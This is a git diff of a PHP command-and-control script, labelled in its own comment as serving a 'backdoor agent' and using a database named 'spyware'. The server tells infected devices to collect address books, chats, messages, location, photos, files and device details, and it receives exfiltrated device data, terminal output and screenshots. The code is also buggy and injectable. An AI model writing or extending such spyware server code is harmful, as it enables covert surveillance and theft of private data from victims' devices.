@@ -2,38 +2,36 @@
 
 /** Parse url from backdoor agent and return configurations if asked **/
 
-$parts = parse_url($url);
-parse_str($parts['query'], $query_params);
+$url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 
-$task = $query_params['task'];
+$parts = parse_url($url);
+$query = $parts["query"];
+parse_str($query, $query_params);
+$parts = parse_url($url);
+
+$task = $query_params["task"];
 if (!empty($task)) {
 	// Create a connection to DB
 	$servername = "localhost";
-	$username = "username";
-	$password = "password";
-	$dbname = "myDB";
+	$username = "zeus";
+	$password = "zeus";
+	$dbname = "spyware";
 
 	// Create connection
-	$conn = mysqli_connect($servername, $username, $password, $dbname);
+	$dbConnection = mysqli_connect($servername, $username, $password, $dbname);
 	// Check connection
-	if (!$conn) {
+	if (!$dbConnection) {
 		die("Connection failed: " . mysqli_connect_error());
 	}
 
 	if ($task == 'getConfigurations') {
 	$social = [];
-
-	/* if ($query_params['agent'] == 'scout') {
-		$social = ["addressbook" => 0, "chat" => 0, "messages" => 0, "position" => 0, "photo" => 0, "file" => 0, "device" => 0];
-	}
-	else if ($query_params['agent'] == 'soldier') {
-		$social = ["addressbook" => 1, "chat" => 0, "messages" => 1, "position" => 1, "photo" => 1, "file" => 0, "device" => 1];
-	}
-	else */ if ($query_params['agent'] == 'zeus') {
-		$social = ["addressbook" => 1, "chat" => 1, "messages" => 1, "position" => 1, "photo" => 1, "file" => 1, "device" => 1];
+	
+	if ($query_params['agent'] == 'zeus') {
+		$social = array("addressbook" => 1, "chat" => 1, "messages" => 1, "position" => 1, "photo" => 1, "file" => 1, "device" => 1);
 	}
 
-	$data = ['screenshoot' => 1, 'social' => $social, 'deviceInfo' => 1];
+	$data = array('screenshoot' => 1, 'social' => $social, 'deviceInfo' => 1);
 
 	header('Content-Type: application/json');
 	echo json_encode($data);
@@ -47,16 +45,36 @@ if (!empty($task)) {
 		// Save to DB
 	}
 	else if ($task == 'deviceInfo') {
-		$deviceInfo = $query_params['data'];
-		
-		// Device info paeams
-		$param1 = $deviceInfo['key1'];
-		$param2 = $deviceInfo['key2'];
-		$param2 = $deviceInfo['key3'];
+		// Create table if not exists
+		$query = "SELECT ID FROM DeviceID";
+		$result = mysqli_query($dbConnection, $query);
 
-		$sql = "INSERT INTO DeviceInfo (" + $deviceInfo['key1'] + ", " + $deviceInfo['key2'] + ", " + $deviceInfo['key3'] + ") VALUES (" + $param1 + ", " + $param2 + ", " + $param3 + ")";
-		queryResults = performSqlQuery($conn, $sql);
-		echo "queryResults: " + queryResults;
+		if(empty($result)) {
+			$query = "CREATE TABLE `DeviceInfo` (ID int(11) AUTO_INCREMENT, `os` text NOT NULL, `cpuArchitecture` int NOT NULL, `installedApps` text NOT NULL, `memory` text NOT NULL, `time` text NOT NULL, `date` text NOT NULL, `deviceID` text NOT NULL, PRIMARY KEY (ID))";
+			$result = mysqli_query($dbConnection, $query);
+		}
+
+		// Get base 64 encoded data & decode it
+		if (!empty($query_params['data'])) {
+			$deviceInfo = $query_params['data'];
+
+			$decodedData = base64_decode($deviceInfo);
+
+			echo "$decodedData: " . $decodedData . "\n";
+
+			$array = explode(',', $decodedData);
+			$deviceInfo = array();
+			array_walk($array,'walk', $deviceInfo);
+
+			echo "$deviceInfo: " . $deviceInfo . "\n";
+
+			$query = "INSERT INTO DeviceInfo ('os', 'cpuArchitecture', 'installedApps', 'memory', 'time', 'date', 'deviceID') VALUES (" . $deviceInfo["os"] . ", " . $deviceInfo["cpuArchitecture"] . ", " . $deviceInfo["installedApps"] . ", " . $deviceInfo["memory"] . ", " + $deviceInfo["time"] . ", " . $deviceInfo["date"] . ", " . $deviceInfo["deviceID"] . ")";
+
+			echo "$query: " . $query . "\n";
+
+			$queryResults = performSqlQuery($dbConnection, $sql);
+			echo "queryResults: " . $queryResults;
+		}
 	}
 	else if ($task == 'terminal') {
 		$terminalOutput = $query_params['data'];
@@ -68,7 +86,12 @@ if (!empty($task)) {
 		file_put_contents('/screenshots/image.png', $base64Image);
 	}
 
-	mysqli_close($conn); // Close connection to DB
+	mysqli_close($dbConnection); // Close connection to DB
+}
+
+function walk($val, $key, &$new_array){
+	$nums = explode('-',$val);
+    $new_array[$nums[0]] = $nums[1];
 }
 
 function performSqlQuery($dbConnection, $sqlQuery) {
@@ -80,8 +103,13 @@ function performSqlQuery($dbConnection, $sqlQuery) {
 	}
 }
 
-function buildSqlQueryFromDictionary($dataDictionary, $tableName) {
-	//
-}
+/* function buildSqlQueryFromDictionary($dataDictionary, $tableName) {
+	$maxSize = count($dataDictionary);
+
+	$query = "INSERT INTO " + $tableName + " (";
+	for ($i=0; $i < maxSize; $i++) { 
+		$key = $dataDictionary.key(array)
+	}
+} */
 
 ?>
